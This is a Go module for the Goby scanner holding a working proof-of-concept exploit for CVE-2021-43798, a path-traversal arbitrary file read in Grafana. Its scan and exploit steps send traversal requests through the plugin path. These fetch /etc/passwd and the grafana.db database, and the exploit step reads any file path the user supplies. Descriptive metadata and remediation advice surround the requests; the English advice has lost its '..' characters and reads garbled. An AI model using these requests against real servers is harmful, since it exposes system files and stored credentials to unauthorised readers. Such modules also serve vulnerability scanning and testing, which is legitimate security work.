package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Grafana welcome Arbitrary File Reading Vulnerability",
    "Description": "<p>Grafana is a cross-platform, open source platform for data visualization web applications. After users configure the connected data source, Grafana can display data graphs and warnings in a Web browser. </p><p>Unauthorized attackers can exploit this vulnerability and gain access to sensitive server files.</p>",
    "Product": "Grafana_Labs-Products",
    "Homepage": "https://grafana.com/",
    "DisclosureDate": "2021-11-16",
    "Author": "3059482795@qq.com",
    "FofaQuery": "app=\"Grafana_Labs-公司产品\"",
    "GobyQuery": "app=\"Grafana_Labs-公司产品\"",
    "Level": "2",
    "Impact": "<p>Grafana can display graphs and warnings in a Web browser. Unauthorized attackers can exploit this vulnerability and gain access to sensitive server files.</p>",
    "Recommendation": "<p>1、The vendor has released a bug fix, please pay attention to the update in time: https://grafana.com/。</p><p>2、Set Grafana to be open only to trusted addresses.</p><p>3、Using agents such as Nginx or load balancing devices to prohibit the inclusion of For temporary defense.</p>",
    "References": [
        "https://blog.csdn.net/qq_36197704/article/details/123480175"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "welcome/../../../../../../../../../etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/public/plugins/welcome/../../../../../../../../../etc/passwd",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:x:0:0:root:",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/public/plugins/gettingstarted/../../../../../../../../../../../../../../../var/lib/grafana/grafana.db",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "data",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/public/plugins/{{{filePath}}}",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:x:0:0:root:",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2021-43798"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Grafana 网络应用程序平台 welcome 任意文件读取漏洞",
            "Product": "Grafana_Labs-公司产品",
            "Description": "<p>&nbsp;Grafana是一个跨平台、开源的数据可视化网络应用程序平台。用户配置连接的数据源之后，Grafana可以在网络浏览器里显示数据图表和警告。<br></p><p>未授权的攻击者利用该漏洞，能够获取服务器敏感文件。<br></p>",
            "Recommendation": "<p>1、厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://grafana.com/\">https://grafana.com/</a>。</p><p>2、设置Grafana仅对可信地址开放</p><p>3、利用Nginx等代理或者负载均衡设备禁止含有 .. 的请求以进行临时防御。</p>",
            "Impact": "<p><span style=\"color: rgb(77, 77, 77); font-size: 16px;\">Grafana可以在网络浏览器里显示数据图表和警告。未授权的攻击者利用该漏洞，能够获取服务器敏感文件。</span><br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Grafana welcome Arbitrary File Reading Vulnerability",
            "Product": "Grafana_Labs-Products",
            "Description": "<p>Grafana is a cross-platform, open source platform for data visualization web applications. After users configure the connected data source, Grafana can display data graphs and warnings in a Web browser.&nbsp;</p><p><span style=\"color: var(--primaryFont-color);\">Unauthorized attackers can exploit this vulnerability and gain access to sensitive server files.</span></p>",
            "Recommendation": "<p>1、The vendor has released a bug fix, please pay attention to the update in time:&nbsp;<span style=\"color: rgb(22, 28, 37); font-size: 16px;\"><a href=\"https://grafana.com/\">https://grafana.com/</a></span>。</p><p>2、Set Grafana to be open only to trusted addresses.</p><p>3、Using agents such as Nginx or load balancing devices to prohibit the inclusion of For temporary defense.</p>",
            "Impact": "<p>Grafana can display graphs and warnings in a Web browser. Unauthorized attackers can exploit this vulnerability and gain access to sensitive server files.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "7376"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}